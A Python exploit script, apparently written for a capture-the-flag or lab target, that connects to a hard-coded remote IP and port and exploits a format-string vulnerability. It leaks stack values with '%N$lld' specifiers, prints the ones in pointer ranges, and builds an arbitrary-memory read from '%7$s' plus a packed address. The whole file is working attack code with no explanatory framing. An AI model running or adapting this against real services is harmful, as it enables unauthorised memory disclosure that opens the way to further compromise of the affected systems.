#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception as e: return b'<T:'+str(e).encode()

def leak_lld(n):
    d=ask("%%%d$lld" % n)
    m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None

def readmem(X, maxlen=512):
    fmt = b"%7$s" + b"AAAA" + struct.pack("<Q", X)
    d=ask(fmt)
    # strip trailing pad "AAAA"+X-bytes
    return d

# leak args 1..20 (lld) on this connection, print those in pointer ranges
for n in range(1,21):
    v=leak_lld(n)
    if v is None: continue
    h=v & ((1<<64)-1)
    if h>0x100000:
        print(n, hex(h))
s.close()
